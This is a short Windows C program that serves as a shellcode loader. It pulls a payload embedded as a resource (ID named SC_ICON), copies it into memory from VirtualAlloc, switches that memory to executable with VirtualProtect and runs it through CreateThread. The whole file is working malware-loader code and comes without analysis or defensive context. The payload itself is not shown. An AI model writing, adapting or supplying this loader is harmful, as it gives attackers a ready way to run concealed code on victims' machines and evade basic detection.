#include <windows.h>
#include <stdio.h>
#include <string.h>

#define SC_ICON 7458
// main code
int main(VOID){

// find shellcode payload
HRSRC shellcode= FindResourceW(NULL,
MAKEINTRESOURCEW(SC_ICON),
RT_RCDATA);

// load shellcode payload
HGLOBAL shellcode_handle= LoadResource(
    NULL,
    shellcode
);

// get pointer to the shellcode payload
LPVOID shellcode_payload= LockResource(
    shellcode_handle
);

// get the length of the shellcode payload
DWORD shellcode_length=SizeofResource(
    NULL,
    shellcode
);

// allocate the memory
LPVOID memory_address=VirtualAlloc(
    NULL,
    shellcode_length,
    MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE
);

// load the shellcode in the memory

RtlMoveMemory(
    memory_address,shellcode_payload,shellcode_length
);

// make shellcode executable
DWORD old_protection=0;
BOOL returned_vp= VirtualProtect(
    memory_address,
    shellcode_length,
    PAGE_EXECUTE_READ,
    & old_protection
);

// execute thread
if(returned_vp!= NULL){
    HANDLE thread_handle= CreateThread(
        NULL,
        NULL,
        (LPTHREAD_START_ROUTINE) memory_address,
        NULL,NULL,NULL
    );

    // wait for thread to complete
    WaitForSingleObject(
        thread_handle,
        INFINITE
    );
}
}